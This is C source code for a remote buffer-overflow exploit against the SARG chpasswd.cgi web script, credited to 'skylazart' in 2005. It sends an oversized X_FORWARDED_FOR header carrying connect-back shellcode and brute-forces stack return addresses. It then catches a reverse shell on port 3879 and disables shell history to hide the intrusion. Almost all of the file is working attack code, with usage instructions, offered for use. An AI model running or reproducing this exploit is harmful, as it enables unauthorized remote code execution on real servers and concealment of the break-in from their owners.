/*
  PRIVATE 0DAY EXPLOIT, DO NOT DISTRIBUTE
  ---------------------------------------
  by skylazart - Jun/2005
  
  http://sarg.sourceforge.net /cgi-bin/chpasswd.cgi remote bufferoverflow
  vulnerability discovered by skylazart at Jun/2005.  

  There are a lot of vulnerabilities into chpasswd.cgi and chetcpasswd.cgi,
  but its not exploitable yet.

  Version 1.1
*/

/*
  Using:

  bash$ ./wwwchpasswd victim /cgi-bin/chpasswd.cgi your_ip

  Enjoy!
*/

/*
  Thankz: destruct_, drk, cync, dm_, hide_, jans :) and cbc
  Special to destruct_ for some help to test brute force methods...
*/

/*
  Suckz: chpasswd.cgi is exploitable only with servers using ip_auth 
  configuration parameter :(
*/


#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <signal.h>
#include "libxpl.h"

#define MAX_CHILDS 50
int total_childs;

#define LNX_STACK_OFFSET_MASK 0xffff0000
#define LNX_STACK_OFFSET_STEP 191

#define HTTP_REQ_1(buf,len,path) \
snprintf (buf, len, "GET %s HTTP/1.0\r\n\r\n", path)

#define HTTP_REQ_2(buf,len,path,host) \
snprintf (buf, len, \
"GET %s HTTP/1.1\r\n" \
"Host: %s\r\n" \
"X_FORWARDED_FOR: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" \
"\r\n\r\n", \
path, host)


// Shellcodes

// Linux NOP
char lnx_noop[] = "\x90";

// Linux endless loop 
char lnx_shellcode_loop[] = "\xeb\xfe";

// Jmp near
// I really dont know if its the better way, but its works!
// eax = geteip addl $100, %eax jmp *eax
char lnx_jmp_retaddrs[] = 
"\xeb\x08"
"\x8b\x0c\x24"
"\x83\xc1\x64"
"\xff\xe1"
"\xe8\xf3\xff\xff\xff";

// Linux connect back shellcode
char lnx_connect_back[] = 
"\x31\xc0"
"\xb0\x02"
"\xcd\x80"
"\x85\xc0"
"\x75\x77"
"\x31\xc0"
"\xb0\x42"
"\xcd\x80"
"\x89\xe5"
"\x31\xd2"
"\xb2\x66"
"\x89\xd0"
"\x31\xc9"
"\x89\xcb"
"\x43"
"\x89\x5d\xf8"
"\x43"
"\x89\x5d\xf4"
"\x4b"
"\x89\x4d\xfc"
"\x8d\x4d\xf4"
"\xcd\x80"
"\x31\xc9"
"\x89\x45\xf4"
"\x43"
"\x66\x89\x5d\xec"
"\x66\xc7\x45\xee\x0f\x27"
"\xc7\x45\xf0"	 
"IPIP" 		/* IP address */
"\x8d\x45\xec"
"\x89\x45\xf8"
"\xc6\x45\xfc\x10"
"\x89\xd0"
"\x43"
"\x8d\x4d\xf4"
"\xcd\x80"
"\x31\xc9"
"\x8b\x5d\xf4"
"\xb0\x3f"
"\xcd\x80"
"\x41"
"\x83\xf9\x03"
"\x75\xf6"
"\x31\xc0"
"\x50"
"\x68\x2f\x2f\x73\x68"
"\x68\x2f\x62\x69\x6e"
"\x89\xe3"
"\x8d\x54\x24\x08"
"\x50"
"\x53"
"\x8d\x0c\x24"
"\xb0\x0b"
"\xcd\x80"
"\x31\xc0"
"\x31\xdb"
"\x40"
"\xcd\x80"; 

// White list like for return addresses
long ret_addrs[] = {
	0xbfffb014,
	0xbfffb451,
	0xbfffa051, 
	0xbfffc051, 
	0xbfffd051,
	0xbfffe051,
	0xbfff9479};

// Functions
long net_resolve (char *dn);
int net_connect (char * dn, int p, int ttl);
int net_has_data (int fd, long ttl);

int test_chpasswd (char * host, char * cgi_path);
int exploit_chpasswd (char * host, char * cgi_path);

long get_esp (void);

int exploit_try_offset (char * host, char * cgi_path, long ret, int align, char * shellcode, int len);

void wait_for_shell (int fd);
void exploit_vrfy (void);

// bind descriptor
int srvfd;

char * ip_conn_back;


// And the precious...
long net_resolve (char *dn)
{
	long i;
	struct hostent *dnPtr;

	i = inet_addr (dn);
	if (i == -1) {
		dnPtr = gethostbyname (dn);
		if (!dnPtr) {
			return (0);
		} else {
			return (*(unsigned long *) dnPtr->h_addr);
		}
	}
	return (i);
}

int net_connect (char * dn, int p, int ttl)
{
	struct sockaddr_in sin;
	struct timeval tv;
	int fd;
	int n;
	int flags;
	fd_set wset;
	fd_set rset;
	int opt = 1024;		/* MAXCAPLEN */
	int one = 1;
	int err = 0;
	socklen_t dummy = sizeof (err);
	
	sin.sin_family = PF_INET;
	sin.sin_port = htons (p);
	if (!(sin.sin_addr.s_addr = net_resolve (dn)))
		return (0);
	memset (&(sin.sin_zero), 0, 8);
	
	if ((fd = socket (AF_INET, SOCK_STREAM, 0)) < 0) {
		return (-1);
	}

	setsockopt (fd, SOL_SOCKET, SO_RCVBUF, (char *)&opt, sizeof (int));
	ioctl (fd, FIONBIO, &one);
	flags = fcntl (fd, F_GETFL, 0);
	fcntl (fd, F_SETFL, O_NONBLOCK | O_NDELAY);
	
	n = connect (fd, (struct sockaddr *)&sin, sizeof (sin));
	if (n == 0)
		goto done;
	
	if (errno != EINPROGRESS) {
		close (fd);
		return (-1);
	}
	
	FD_ZERO (&wset);
	FD_ZERO (&rset);
	FD_SET (fd, &wset);
	FD_SET (fd, &rset);
	tv.tv_usec = 0;
	tv.tv_sec = ttl;
	
	if ((n = select (fd + 1, &rset, &wset, NULL, &tv)) == 0) {
		close (fd);
		errno = ETIMEDOUT;
		return (-1);
	}
	
	if (FD_ISSET (fd, &wset) || FD_ISSET (fd, &rset)) {
		if (getsockopt (fd, SOL_SOCKET, SO_ERROR, &err, &dummy)<0) {
			close (fd);
			return (-1);
		} else {
			if (err == 0) {
				goto done;
			} else {
				close (fd);
				return (-1);
			}
		}
	}
 done:
	n = 0;
	ioctl (fd, FIONBIO, &n);
	fcntl (fd, F_SETFL, flags);

	return (fd);	
}

int net_has_data (int fd, long ttl)
{
	struct timeval tv;
	fd_set rset;
	tv.tv_usec = 0;
	tv.tv_sec = ttl;
	FD_ZERO (&rset);
	FD_SET (fd, &rset);
	return (select (fd + 1, &rset, NULL, NULL, &tv));
}

int net_bind (char * ip, int p)
{
	int fd;
	struct sockaddr_in sin;
	const int on = 1;

	if (!(fd = socket (PF_INET, SOCK_STREAM, 0)))
		return (-1);

	sin.sin_family = PF_INET;
	sin.sin_port = htons (p);
	if (ip) sin.sin_addr.s_addr = inet_addr (ip);
	else sin.sin_addr.s_addr = INADDR_ANY;
	memset (&(sin.sin_zero), 0, 8);

	if (setsockopt (fd, SOL_SOCKET, SO_REUSEADDR, (const char *)&on, sizeof (on)) != 0)
		return (-1);

	if (bind (fd, (struct sockaddr *)&sin, sizeof (sin)) < 0)
		return (-1);

	if (fcntl (fd, F_SETFD, 1) < 0) {
		close (fd);
		return (-1);
	}

	if (listen (fd, 10) == -1)
		return (-1);

	return (fd);
}
 
int test_chpasswd (char * host, char * cgi_path)
{
	int sockfd;
	char buf[8192];
	int n;
	char * p;

	printf ("> Fase 1, Checking vulnerability.\n");
	printf ("> 1. Connecting... ");
	sockfd = net_connect (host, 80, 30);
	if (sockfd <= 0) {
		printf ("failed\n");
		return (-1);
	}
	printf ("ok!\n");

	printf ("> 2. Vrfying %s ", cgi_path);

	HTTP_REQ_1(buf, sizeof (buf)-1, cgi_path);
	write (sockfd, buf, strlen (buf));

	while (1) {
		if (!net_has_data (sockfd, 10)) {
			printf ("read timeout\n");
			return (0);
		}
		n = read (sockfd, buf, sizeof (buf)-1);
		if (n == -1) {
			perror ("read");
			close (sockfd);
			return (0);
		}
		
		if (n == 0) {
			printf ("connection terminated!");
			return (1);
		}		
		
		buf[n] = 0;
		//fprintf (stderr, "%s", buf);
		
		if (strstr (buf, "HTTP/1.")) {
			p = strchr (buf, ' ');
			if (!p) {
				printf ("failure parsing http response!\n");
				close (sockfd);
				return (0);
			}
			
			p++;
			if (strncmp (p, "200", 3) == 0) {
				printf ("200 OK\n");
				break;
			} else {
				printf ("%.3s FAILED\n", p);
				close (sockfd);
				return (0);
			}
		}

	}

	close (sockfd);

	printf ("> 3. Testing CGI... ");
	fflush (stdout);

	sockfd = net_connect (host, 80, 300);
	if (sockfd <= 0) {
		printf ("connection failed\n");
		return (-1);
	}

	HTTP_REQ_2(buf, sizeof (buf)-1, cgi_path, host);
	write (sockfd, buf, strlen (buf));

	while (1) {
		if (!net_has_data (sockfd, 300)) {
			printf ("read timeout\n");
			close (sockfd);
			return (0);
		}

		n = read (sockfd, buf, sizeof (buf)-1);
		if (n == -1) {
			perror ("read");
			close (sockfd);
			return (0);
		}
		
		if (n == 0) {
			printf ("connection terminated!");
			return (1);
		}		
		
		buf[n] = 0;
		//fprintf (stderr, "%s", buf);
		
		if (strstr (buf, "HTTP/1.")) {
			p = strchr (buf, ' ');
			if (!p) {
				printf ("failure parsing http response!\n");
				close (sockfd);
				return (0);
			}
			
			p++;
			if (strncmp (p, "500", 3) == 0) {
				printf ("500 INTERNAL SERVER ERROR (crash)\n");
				break;
			} else {
				printf ("%.3s FAILED\n", p);
				close (sockfd);
				return (0);
			}
		}

	}

	close (sockfd);	

	return (1);
}

int exploit_chpasswd (char * host, char * cgi_path)
{
	long ret;
	long esp_base;
	int align;
	int steps;
	int i;
	int offset;
	pid_t pid;
	int status;

	printf ("> Fase 2, Real exploiting.\n");
	esp_base = get_esp () & LNX_STACK_OFFSET_MASK;
	printf (" Using return address around 0x%08x. Wait for a while...\n", esp_base);
	fflush (stdout);

	i = 0;
	steps = 0;

	while (ret_addrs[i] != 0) {
		for (align = 0; align < 4; align++) {
			printf ("\r-> Step %d: 0x%08x align=%d ", steps++, ret_addrs[i], align);			
			fflush (stdout);
			
			if (total_childs > MAX_CHILDS) {
				waitpid (-1, &status, 0);
				total_childs--;
			}

			total_childs++;

			pid = fork ();
			if (pid == 0) {
				exploit_try_offset (host, cgi_path, ret_addrs[i], align, lnx_connect_back, sizeof (lnx_connect_back));
				_exit (0);
			} else {
				exploit_vrfy ();
			}
		}
		i++;
	}
				
	ret = esp_base;

	do {
		ret += LNX_STACK_OFFSET_STEP;
		for (align = 0; align < 4; align++) {
			printf ("\r-> Step %d: 0x%08x align=%d ", steps++, ret, align);			
			fflush (stdout);

			if (total_childs > MAX_CHILDS) {
				waitpid (-1, &status, 0);
				total_childs--;
			}

			total_childs++;

			pid = fork ();
			if (pid == 0) {
				exploit_try_offset (host, cgi_path, ret, align, lnx_connect_back, sizeof (lnx_connect_back));
				_exit (0);
			} else {
				exploit_vrfy ();
			}
		}
	} while (
		((ret & 0xffff0000) >> 16) ==
		((esp_base & 0xffff0000) >> 16));
	printf ("\n");
}

long get_esp (void)
{
	__asm__ ("movl %esp, %eax");
}

int exploit_try_offset (char * host, char * cgi_path, long ret, int align, char * shellcode, int len)
{
	XPL xpl;
	char data[2048];
	char *evil, *ptr;
	int evillen;
	int sockfd;
	int i, j, n;
	int retries;
	long temp, myip;

	snprintf (data, sizeof (data)-1, 
		  "GET %s HTTP/1.1\r\n"
		  "Host: %s\r\n"
		  "X_FORWARDED_FOR: ", cgi_path, host);
	
	xpl_init (&xpl);
	xpl_inst (&xpl, lnx_noop, 1, 196+align);
	xpl_inst (&xpl, lnx_jmp_retaddrs, sizeof (lnx_jmp_retaddrs)-1, 1);
	xpl_inst (&xpl, &ret, sizeof (long), 22);
	xpl_inst (&xpl, lnx_noop, 1, 200);
	xpl_inst (&xpl, shellcode, len, 1);
	evil = xpl_buf (&xpl);
	evillen = xpl_len (&xpl);

	myip = 0;
	temp = htonl (inet_addr (ip_conn_back));
	myip |= (temp & 0x000000ff) << 24;
	myip |= (temp & 0x0000ff00) << 8;
	myip |= (temp & 0x00ff0000) >> 8;
	myip |= (temp & 0xff000000) >> 24;

	ptr = strstr (evil, "IPIP");
	if (ptr) {
		*(long *)ptr = (long)myip;
	}	
	
	// Checkint invalid bytes
	for (i = 0; i < evillen; i++) {
		if (evil[i] & 255 == '\0' || 
		    evil[i] & 255 == '\n' || 
		    evil[i] & 255 == '\r' ) {
			// Invalid byte
			printf ("\nret = 0x%08x - byte erro #%d: bytes (%d %d %d) = (\\x%02x \\x%02x \\x%02x)\n", ret, i,  i-1, i, i+1, evil[i-1] & 255, evil[i] & 255, evil[i+1] & 255);
			xpl_end (&xpl);

			return (0);
		}
	}

	// Okay, shellcode without invalid bytes

	// Try to connect
	for (retries = 0; retries < 10; retries++) {
		sockfd = net_connect (host, 80, 10);
		if (sockfd <= 0) {
			usleep (1000);
			continue;
		} else {
			break;
		}
	}

	if (sockfd <= 0) {
		printf ("connection failed\n");
		return (0);
	}

	write (sockfd, data, strlen (data));
	write (sockfd, evil, evillen);	
	write (sockfd, "\r\n\r\n", 4);

	xpl_end (&xpl);

	memset (data, 0, sizeof (data));

	while (1) {
		if (!net_has_data (sockfd, 6)) {
			//printf ("read timeout\n");
			close (sockfd);
			return (0);
		}
		n = read (sockfd, data, sizeof (data)-1);
		if (n == -1) {
			perror ("read");
			close (sockfd);
			return (0);
		}
		
		if (n == 0) {
			close (sockfd);
			//printf ("connection terminated!");
			return (0);
		}		
		
		data[n] = 0;
	}
	close (sockfd);
	
	return (0);
}

void wait_for_shell (int srvfd)
{
	int fd;
	struct sockaddr_in sin;
	socklen_t socklen = sizeof (sin);
	fd_set rfds;
	struct timeval tv;
	int n;
	char buf[2048];

	fd = accept (srvfd, (struct sockaddr *)&sin, &socklen);

	if (fd == -1) {
		fprintf (stderr, "Accept: %s\n", strerror (errno));
		exit (-1);
	}
	
	fflush (stdout);
	fflush (stderr);

	printf ("Exploit sucess\n");
	printf ("\r\n\n>>> Gota shell. Connection from %s\n", inet_ntoa (sin.sin_addr));
	write (fd, "bash -i;\r\n", 11);
	write (fd, "export HISTFILE=/dev/null;\r\n", 29);

	while (1) {
		FD_ZERO (&rfds);
		FD_SET (fd, &rfds);
		FD_SET (1, &rfds);
		tv.tv_usec = 100;
		tv.tv_sec = 0;

		n = select (fd + 1, &rfds, NULL, NULL, &tv);
		if (n == 0) 
			continue;
		if (FD_ISSET (1, &rfds)) {
			n = read (1, buf, sizeof (buf));
			if (n == 0) {
				break;
			}
			buf[n] = 0;
			write (fd, buf, n);
		}

		if (FD_ISSET (fd, &rfds)) {
			n = read (fd, buf, sizeof (buf));
			if (n == 0) {
				break;
			}
			buf[n] = 0;
			write (1, buf, n);
		}		    
	}
	
	printf ("Connection terminated\n");
	close (fd);
	exit (0);
}

void exploit_vrfy (void)
{
	int n;
	fd_set rfds;
	struct timeval tv;      
	
	FD_ZERO (&rfds);
	FD_SET (srvfd, &rfds);
	tv.tv_usec = 100;
	tv.tv_sec = 0;
	
	n = select (srvfd + 1, &rfds, NULL, NULL, &tv);
	if (n) {
		wait_for_shell (srvfd);			
	}
}


int main (int argc, char ** argv)
{
	char * host;
	char * cgi_path;

	printf ("PRIVATE 0DAY EXPLOIT, DO NOT DISTRIBUTE\n"
		"Remote chpasswd.cgi Exploit for Linux/x86\n"
		"by skylazart - Jun/2005\n\n");

	if (argc < 4) {
		printf ("%s <host> <cgi-path> <your ip addr>\n", argv[0]);
		exit (1);
	}

	setbuf (stdin, NULL);

	host = argv[1];
	cgi_path = argv[2];
	ip_conn_back = argv[3];

	srvfd = net_bind ("0.0.0.0", 3879);
	if (srvfd == -1) {
		fprintf (stderr, "Error binding port 3879\n");
		exit (-1);
	}

	printf ("> Trying http://%s%s\n\n", host, cgi_path);

	if (test_chpasswd (host, cgi_path) == 1) {
		exploit_chpasswd (host, cgi_path);
	}

	return (0);
}


